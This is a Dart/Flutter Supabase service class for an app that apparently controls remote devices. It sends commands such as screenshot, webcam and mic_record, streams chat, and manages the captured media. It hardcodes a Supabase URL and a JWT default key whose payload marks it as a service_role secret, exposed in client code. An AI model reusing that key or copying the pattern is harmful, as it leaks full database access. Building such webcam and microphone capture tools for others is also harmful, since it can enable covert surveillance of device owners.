import 'dart:async';
import 'package:flutter/foundation.dart';
import 'package:supabase_flutter/supabase_flutter.dart';
import 'package:shared_preferences/shared_preferences.dart';

class SupabaseService {
  static final SupabaseService _instance = SupabaseService._internal();
  factory SupabaseService() => _instance;
  SupabaseService._internal();

  // Default credentials
  static const String defaultUrl = 'https://ezyrqwqzabkffqpsmfew.supabase.co';
  static const String defaultKey =
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImV6eXJxd3F6YWJrZmZxcHNtZmV3Iiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc5MDI0OTMyOSwiZXhwIjoyMTA1ODI1MzI5fQ.EC10vCeuV37X4jv3PhaFz9i0sBSvZNZqpPwErE2RnrE';

  static const String keyPrefUrl = 'supabase_url';
  static const String keyPrefKey = 'supabase_key';

  bool _isInitialized = false;
  bool get isInitialized => _isInitialized;

  SupabaseClient get client => Supabase.instance.client;

  Future<bool> initialize({String? customUrl, String? customKey}) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final url = customUrl ?? prefs.getString(keyPrefUrl) ?? defaultUrl;
      final key = customKey ?? prefs.getString(keyPrefKey) ?? defaultKey;

      if (_isInitialized) {
        return true;
      }

      await Supabase.initialize(
        url: url.trim(),
        anonKey: key.trim(),
        debug: kDebugMode,
      );

      _isInitialized = true;
      return true;
    } catch (e) {
      debugPrint('Supabase init error: $e');
      return false;
    }
  }

  Future<void> saveCredentials(String url, String key) async {
    final prefs = await SharedPreferences.getInstance();
    await prefs.setString(keyPrefUrl, url.trim());
    await prefs.setString(keyPrefKey, key.trim());
  }

  Future<Map<String, String>> getSavedCredentials() async {
    final prefs = await SharedPreferences.getInstance();
    return {
      'url': prefs.getString(keyPrefUrl) ?? defaultUrl,
      'key': prefs.getString(keyPrefKey) ?? defaultKey,
    };
  }

  Future<void> resetCredentials() async {
    final prefs = await SharedPreferences.getInstance();
    await prefs.remove(keyPrefUrl);
    await prefs.remove(keyPrefKey);
  }

  // Devices API
  Future<List<Map<String, dynamic>>> getDevices() async {
    try {
      final response = await client
          .from('devices')
          .select()
          .order('last_heartbeat', ascending: false);
      return List<Map<String, dynamic>>.from(response);
    } catch (e) {
      debugPrint('Error getting devices: $e');
      return [];
    }
  }

  Stream<List<Map<String, dynamic>>> streamDevices() {
    return client
        .from('devices')
        .stream(primaryKey: ['id'])
        .order('last_heartbeat', ascending: false);
  }

  // Commands API
  Future<void> sendCommand(String deviceId, String commandType,
      [Map<String, dynamic>? payload]) async {
    await client.from('commands').insert({
      'device_id': deviceId,
      'command_type': commandType,
      'status': 'pending',
      'payload': payload ?? {},
    });
  }

  // Messages API (Live Bidirectional Chat)
  Stream<List<Map<String, dynamic>>> streamMessages(String deviceId) {
    return client
        .from('messages')
        .stream(primaryKey: ['id'])
        .eq('device_id', deviceId)
        .order('created_at', ascending: true);
  }

  Future<void> sendMessage(String deviceId, String text) async {
    await client.from('messages').insert({
      'device_id': deviceId,
      'sender': 'mobile',
      'text': text.trim(),
    });
  }

  // Activity Log API
  Future<List<Map<String, dynamic>>> getActivityLogs(String deviceId,
      {int limit = 30}) async {
    try {
      final response = await client
          .from('activity_log')
          .select()
          .eq('device_id', deviceId)
          .order('created_at', ascending: false)
          .limit(limit);
      return List<Map<String, dynamic>>.from(response);
    } catch (e) {
      debugPrint('Error getting activity logs: $e');
      return [];
    }
  }

  // Storage Media Files from completed commands
  Future<List<Map<String, dynamic>>> getMediaFiles([String? deviceId]) async {
    try {
      var filter = client
          .from('commands')
          .select()
          .not('result_url', 'is', null);

      if (deviceId != null && deviceId.isNotEmpty) {
        filter = filter.eq('device_id', deviceId);
      }

      final response = await filter
          .order('created_at', ascending: false)
          .limit(50);
      final List<Map<String, dynamic>> results = [];

      for (final cmd in response) {
        final rawUrl = cmd['result_url'] as String? ?? '';
        if (rawUrl.isEmpty) continue;

        final type = cmd['command_type'] as String? ?? '';
        final isImage = type == 'screenshot' || type == 'webcam';
        final isAudio = type == 'mic_record';

        // Extract relative storage path and generate fresh signed URL
        String finalUrl = rawUrl;
        if (rawUrl.contains('/alertrox-files/')) {
          try {
            final pathPart = rawUrl.split('/alertrox-files/')[1].split('?')[0];
            final freshUrl = await client.storage
                .from('alertrox-files')
                .createSignedUrl(pathPart, 86400);
            if (freshUrl.isNotEmpty) finalUrl = freshUrl;
          } catch (_) {}
        }

        results.add({
          'id': cmd['id'],
          'name': '$type — ${_formatMediaTime(cmd['executed_at'] ?? cmd['created_at'])}',
          'type': type,
          'created_at': cmd['executed_at'] ?? cmd['created_at'],
          'url': finalUrl,
          'is_image': isImage,
          'is_audio': isAudio,
        });
      }

      return results;
    } catch (e) {
      debugPrint('Error getting media files: $e');
      return [];
    }
  }

  String _formatMediaTime(String? isoString) {
    if (isoString == null) return '';
    try {
      final dt = DateTime.parse(isoString).toLocal();
      return '${dt.year}-${dt.month.toString().padLeft(2, '0')}-${dt.day.toString().padLeft(2, '0')} ${dt.hour.toString().padLeft(2, '0')}:${dt.minute.toString().padLeft(2, '0')}';
    } catch (_) {
      return isoString;
    }
  }

  // Clear all media files from Storage and database
  Future<void> clearMediaFiles([String? deviceId]) async {
    try {
      var filter = client
          .from('commands')
          .select('id, result_url')
          .not('result_url', 'is', null);

      if (deviceId != null && deviceId.isNotEmpty) {
        filter = filter.eq('device_id', deviceId);
      }

      final records = await filter;
      final List<String> pathsToDelete = [];

      for (final rec in records) {
        final rawUrl = rec['result_url'] as String? ?? '';
        if (rawUrl.contains('/alertrox-files/')) {
          final path = rawUrl.split('/alertrox-files/')[1].split('?')[0];
          if (path.isNotEmpty) {
            pathsToDelete.add(path);
          }
        }
      }

      // 1. Delete from Supabase Storage
      if (pathsToDelete.isNotEmpty) {
        try {
          await client.storage.from('alertrox-files').remove(pathsToDelete);
        } catch (e) {
          debugPrint('Storage remove warning: $e');
        }
      }

      // 2. Clear result_url in commands table
      if (deviceId != null && deviceId.isNotEmpty) {
        await client
            .from('commands')
            .update({'result_url': null})
            .eq('device_id', deviceId)
            .not('result_url', 'is', null);
      } else {
        await client
            .from('commands')
            .update({'result_url': null})
            .not('result_url', 'is', null);
      }
    } catch (e) {
      debugPrint('Error clearing media files: $e');
      rethrow;
    }
  }
}
